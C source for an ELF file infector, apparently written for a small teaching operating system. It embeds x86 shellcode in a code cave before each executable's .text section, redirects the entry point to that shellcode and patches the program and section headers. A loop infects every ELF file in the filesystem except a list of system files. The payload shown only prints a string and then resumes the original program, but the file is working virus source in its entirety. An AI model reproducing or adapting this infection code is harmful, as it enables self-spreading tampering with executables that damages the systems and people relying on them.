#include "inject.h"

u8 shellcode[] =
"\x60\xeb\x0d\x5a\x31\xc0\xcd\x90\x61\xbb"
"\x00\x00\x00\x00\xff\xe3\xe8\xee\xff\xff"
"\xff\x59\x44\x53\x20\x4c\x4a\x20\x43\x43\x52\x0a\x00";

int verifyELF(Elf32_Ehdr ELFHeader)
{
    unsigned char e_ident[EI_NIDENT] = {0x7f, 'E', 'L', 'F'};
    for (int i = 0; i < 4; i++)
    {
        if (ELFHeader.e_ident[i] != e_ident[i])
            return 0;
    }
    return 1;
}

int inject(const char* pathname)
{
    Elf32_Ehdr ELFHeader;
    Elf32_Phdr ProgramHeader;
    Elf32_Shdr SectionHeader;

    int FD = open(pathname, O_RDWR);
    read(FD, &ELFHeader, sizeof(ELFHeader));
    if (!verifyELF(ELFHeader))
    {
        printf("%s is not a ELF!", pathname);
        return 0;
    }
    lseek(FD, ELFHeader.e_phoff, SEEK_SET);
    read(FD, &ProgramHeader, sizeof(ProgramHeader));
    lseek(FD, ELFHeader.e_shoff + ELFHeader.e_shentsize, SEEK_SET);
    read(FD, &SectionHeader, sizeof(SectionHeader)); // .text section

    // Save the original entry 
    Elf32_Addr OriginalEntry = ELFHeader.e_entry;
    u8 OriginalEntryU8[4];
    for (int i = 0; i < 4; i++)
        OriginalEntryU8[i] = (u8)(OriginalEntry >> (8 * i));
    printf("OriginalEntryPoint is %x\n", OriginalEntry);

    // Search code cave
    int SectionOffset = SectionHeader.sh_offset;
    printf("SectionOffset is %x\n", SectionOffset);
    int InjectionOffset = SectionOffset - sizeof(shellcode);
    lseek(FD, InjectionOffset, SEEK_SET);
    u8 Buf[sizeof(shellcode)];
    int flag = 1;
    read(FD, &Buf, sizeof(shellcode));
    for (int i = 0; i < sizeof(shellcode); i++)
    {
        if (Buf[i] != 0)
        {
            flag = 0;
            break;
        }
    }

    if (flag)
    {
        // for(int i=0;i<32;i++)
        //     printf("%x ", *(shellcode +i));
        // printf("\n");
        // inject and copy the originalEntryAddr
        memcpy(shellcode + sizeof(shellcode) - 24, OriginalEntryU8, 4);
        lseek(FD, InjectionOffset, SEEK_SET);
        write(FD, &shellcode, sizeof(shellcode));
        // for(int i=0;i<32;i++)
        //     printf("%x ", *(shellcode +i));
        // printf("\n");
        // modify the entrypoint
        printf("Modified EntryPoint is %x\n", InjectionOffset);
        ELFHeader.e_entry = InjectionOffset;

        // modify the ProgramHeader
        ProgramHeader.p_vaddr = InjectionOffset;
        ProgramHeader.p_offset = InjectionOffset;
        ProgramHeader.p_filesz += sizeof(shellcode);
        ProgramHeader.p_memsz += sizeof(shellcode);
        ProgramHeader.p_align = 0;
        lseek(FD, ELFHeader.e_phoff, SEEK_SET);
        write(FD, &ProgramHeader, sizeof(ProgramHeader));

        // modify the SectionHeader
        SectionHeader.sh_offset -= sizeof(shellcode);
        SectionHeader.sh_size += sizeof(shellcode);
        SectionHeader.sh_addr = InjectionOffset;
        SectionHeader.sh_addralign = 0;
        lseek(FD, ELFHeader.e_shoff + ELFHeader.e_shentsize, SEEK_SET);
        write(FD, &SectionHeader, sizeof(SectionHeader));

        lseek(FD, 0, SEEK_SET);
        write(FD, &ELFHeader, sizeof(ELFHeader));

        close(FD);
        return 1;
    }
    
    return 0;
}

int isValidELF(char* filename)
{
    if (strcmp(".", filename) == 0 ||
        strcmp("kernel.bin", filename) == 0 ||
        strcmp("dev_tty0", filename) == 0 ||
        strcmp("dev_tty1", filename) == 0 ||
        strcmp("dev_tty2", filename) == 0 ||
        strcmp("injectAllELF", filename) == 0 ||
        strcmp("inject", filename) == 0 ||
        strcmp("hdboot.bin", filename) == 0 || 
        strcmp("hdloader.bin", filename) == 0 ||
        strcmp("cmd.tar", filename) == 0 ||
        strcmp("", filename) == 0
        )
    return 0;
    
    return 1;
}

int injectAllELF()
{
    char* FileBUF = list();
	int i;
	char filename[MAX_FILENAME_LEN + 1] = {0};

	for(i = 0; *(FileBUF + i * MAX_FILENAME_LEN); i++) {
		memcpy((void*)filename, 
        (void*)(FileBUF + i * MAX_FILENAME_LEN), 
        MAX_FILENAME_LEN);
        if (isValidELF(filename))
        {
            inject(filename);
            printf("Successfully inject file: %s\n", filename);
        }
	}

    return 1;
}